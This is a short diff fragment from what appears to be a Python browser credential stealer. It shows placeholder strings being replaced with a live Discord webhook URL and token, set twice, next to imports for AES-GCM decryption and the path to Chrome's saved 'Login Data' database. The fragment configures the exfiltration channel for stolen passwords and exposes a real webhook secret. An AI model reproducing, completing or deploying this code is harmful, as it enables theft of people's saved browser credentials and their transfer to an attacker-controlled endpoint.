@@ -50,10 +50,10 @@ from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 
 #DISCORD WEBHOOK:
 hook = Webhook(
-    "webhook")
+    "https://discord.com/api/webhooks/1235923257342033980/eIv52THoi3G-c6Po5wG2mjmlR8WtA2rncUJuR39nU0aZ7gVNGAUXD8krl4wGjvXLoePi")
 #DISCORD WEBHOOK 2:
 hooks = Webhook(
-    "webhook")
+    "https://discord.com/api/webhooks/1235923257342033980/eIv52THoi3G-c6Po5wG2mjmlR8WtA2rncUJuR39nU0aZ7gVNGAUXD8krl4wGjvXLoePi")
 
 APP_DATA_PATH = os.environ['LOCALAPPDATA']
 DB_PATH = r'Google\Chrome\User Data\Default\Login Data'
